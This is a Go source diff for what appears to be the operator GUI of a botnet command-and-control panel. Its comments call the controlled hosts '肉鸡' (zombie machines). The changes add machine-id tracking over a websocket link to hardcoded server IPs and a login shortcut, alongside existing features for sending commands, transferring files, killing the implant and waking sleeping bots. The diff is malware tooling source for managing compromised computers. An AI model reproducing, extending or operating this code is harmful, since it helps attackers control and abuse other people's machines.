@@ -29,9 +29,9 @@ const (
 )
 
 var (
-	//baseUrl = "172.16.5.1" //"127.0.0.1" //"172.16.5.1"
-	//baseUrl     = ""
-	baseUrl     = ""
+	baseUrl = "172.16.5.1" //"127.0.0.1" //"172.16.5.1"
+	//baseUrl     = "124.156.100.149:8080"
+	//baseUrl     = "106.54.242.217"
 	conn        *websocket.Conn
 	origin      = "http://" + baseUrl + "/"
 	url         = "ws://" + baseUrl + "/svrConnControlHandler"
@@ -44,10 +44,11 @@ var (
 )
 
 type Message struct {
-	Uuid string `json:"uuid"`
-	Ip   string `json:"ip"`
-	Name string `json:"name"`
-	Msg  string `json:"msg"`
+	Uuid      string `json:"uuid"`
+	Machineid string `json:"machineid"` //客户端唯一识别码
+	Ip        string `json:"ip"`
+	Name      string `json:"name"`
+	Msg       string `json:"msg"`
 
 	FileName string `json:"fileName"`
 	FileBody string `json:"fileBody"`
@@ -56,7 +57,11 @@ type Message struct {
 }
 
 func NewMessage() Message {
-	return Message{Uuid: random, Ip: ipInfo.Text()}
+	if ipInfo.Text() != "" {
+		info := strings.Split(ipInfo.Text(), "--")
+		return Message{Uuid: random, Ip: info[0], Machineid: info[1]}
+	}
+	return Message{Uuid: random}
 }
 
 func init() {
@@ -127,7 +132,7 @@ func receiveMsg() { //接收返回的消息
 			} else if message.Name == UPDATE_REMARK { //修改肉鸡备注
 				//同步修改列表信息
 				for i, v := range model.items {
-					if v.IP == message.Ip {
+					if v.Machineid == message.Machineid {
 						model.items[i].Remark = message.Msg
 						break
 					}
@@ -135,7 +140,7 @@ func receiveMsg() { //接收返回的消息
 				model.PublishRowsReset()
 				//同步修改全局缓存
 				for i, v := range AllData {
-					if v.IP == message.Ip {
+					if v.Machineid == message.Machineid {
 						AllData[i].Remark = message.Msg
 						break
 					}
@@ -145,7 +150,7 @@ func receiveMsg() { //接收返回的消息
 					var tmp walk.Form
 					walk.MsgBox(tmp, "警告", message.Ip+"正在被用户"+message.Uuid+"操作，您依然可以操作此IP，但请注意风险！", walk.MsgBoxIconInformation)
 				}
-				outTE.SetText(message.Msg)
+				_ = outTE.SetText(message.Msg)
 			} else if message.Name == SLEEP_ROUSE { //休眠/唤醒提醒
 				outTE.AppendText(message.Ip + " 已唤醒，请继续你的表演！\r\n")
 			}
@@ -208,7 +213,6 @@ wait:
 var outTE *walk.TextEdit
 var ipInfo, remark, cmd, search *walk.LineEdit
 
-//var outTEMap = map[string]string{}
 var mw *walk.MainWindow
 var tv *walk.TableView
 var model = NewCondomModel()
@@ -226,8 +230,22 @@ func main() {
 			Composite{
 				Layout: Grid{Columns: 1},
 				Children: []Widget{
-					LineEdit{AssignTo: &loginNameTE, CueBanner: "name"},
-					LineEdit{AssignTo: &loginPwdTE, CueBanner: "pwd"},
+					LineEdit{AssignTo: &loginNameTE, CueBanner: "name",
+						OnKeyDown: func(key walk.Key) {
+							if "Return" == key.String() {
+								login = loginNameTE.Text() + "-" + loginPwdTE.Text() //设置全局登陆信息
+								runMainWindow(loginMW)
+							}
+						},
+					},
+					LineEdit{AssignTo: &loginPwdTE, CueBanner: "pwd",
+						OnKeyDown: func(key walk.Key) {
+							if "Return" == key.String() {
+								login = loginNameTE.Text() + "-" + loginPwdTE.Text() //设置全局登陆信息
+								runMainWindow(loginMW)
+							}
+						},
+					},
 					PushButton{
 						Text: "登陆",
 						OnClicked: func() {
@@ -257,7 +275,7 @@ func runMainWindow(loginMW *walk.MainWindow) { //主要操作面板
 		walk.MsgBox(tmp, "连接服务器失败", err.Error(), walk.MsgBoxIconInformation)
 		return
 	}
-	loginMW.Close() //登陆成功，关闭登录页
+	_ = loginMW.Close() //登陆成功，关闭登录页
 	walk.FocusEffect, _ = walk.NewBorderGlowEffect(walk.RGB(0, 63, 255))
 	walk.InteractionEffect, _ = walk.NewDropShadowEffect(walk.RGB(63, 63, 63))
 	walk.ValidationErrorEffect, _ = walk.NewBorderGlowEffect(walk.RGB(255, 0, 0))
@@ -284,9 +302,11 @@ func runMainWindow(loginMW *walk.MainWindow) { //主要操作面板
 									{Title: "whoami"},
 									{Title: "name"},
 									{Title: "time"},
+									{Title: "machineid"},
 								},
 								Model:                 model,
 								OnCurrentIndexChanged: func() { tableRowClick(model) },
+								//OnMouseDown:           tableOnMouseDown,
 							},
 							Composite{
 								StretchFactor: 1, //左面板下搜索框占用比例
@@ -348,6 +368,16 @@ func runMainWindow(loginMW *walk.MainWindow) { //主要操作面板
 		walk.MsgBox(tmp, "未知错误", err.Error(), walk.MsgBoxIconInformation)
 	}
 }
+
+//func tableOnMouseDown(x, y int, button walk.MouseButton) {
+//	if button == 2 { //反键
+//		if ipInfo.Text() == "" { //没有选择ip
+//			var tmp walk.Form
+//			walk.MsgBox(tmp, "请先选择要操作的ip", "请先选择要操作的ip", walk.MsgBoxIconInformation)
+//			return
+//		}
+//	}
+//}
 
 func killMe() {
 	if ipInfo.Text() == "" { //没有选择ip
@@ -518,9 +548,10 @@ func tableRowClick(model *CondomModel) {
 		return
 	}
 	ip := model.items[i].IP
+	machineid := model.items[i].Machineid
 	remarkStr := model.items[i].Remark
 	ip = strings.Replace(ip, "*", "", -1) //替换掉可能有*号的ip
-	ipInfo.SetText(ip)
+	ipInfo.SetText(ip + "--" + machineid)
 	remark.SetText(remarkStr)
 
 	//更换新ip的输出信息
